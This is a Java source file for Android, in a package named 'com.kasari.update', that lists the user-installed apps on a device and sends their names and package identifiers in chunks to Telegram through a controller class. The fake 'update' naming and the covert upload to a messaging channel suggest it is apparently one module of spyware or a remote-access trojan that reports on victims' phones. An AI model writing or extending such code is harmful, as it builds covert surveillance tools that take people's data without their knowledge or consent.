package com.kasari.update;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class AppManager {

    public static void sendApps(Context context) {
        new Thread(() -> {
            try {
                PackageManager pm = context.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(
                    PackageManager.GET_META_DATA);
                
                Collections.sort(apps, (a, b) -> 
                    pm.getApplicationLabel(a).toString().compareToIgnoreCase(
                        pm.getApplicationLabel(b).toString()));
                
                StringBuilder sb = new StringBuilder();
                sb.append("📋 **Installed Apps (").append(apps.size()).append(")**\n\n");
                
                int userApps = 0;
                int systemApps = 0;
                
                for (ApplicationInfo app : apps) {
                    String name = pm.getApplicationLabel(app).toString();
                    String packageName = app.packageName;
                    boolean isSystem = (app.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                    
                    if (isSystem) {
                        systemApps++;
                        continue;
                    }
                    
                    userApps++;
                    
                    String entry = "📱 " + name + "\n🔹 " + packageName + "\n\n";
                    
                    if (sb.length() + entry.length() > 4000) {
                        TelegramController.sendMessage(context, sb.toString());
                        Thread.sleep(1000);
                        sb = new StringBuilder();
                    }
                    
                    sb.append(entry);
                }
                
                if (sb.length() > 0) {
                    TelegramController.sendMessage(context, sb.toString());
                }
                
                TelegramController.sendMessage(context, 
                    "📋 Summary: " + userApps + " user apps, " + systemApps + " system apps");
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}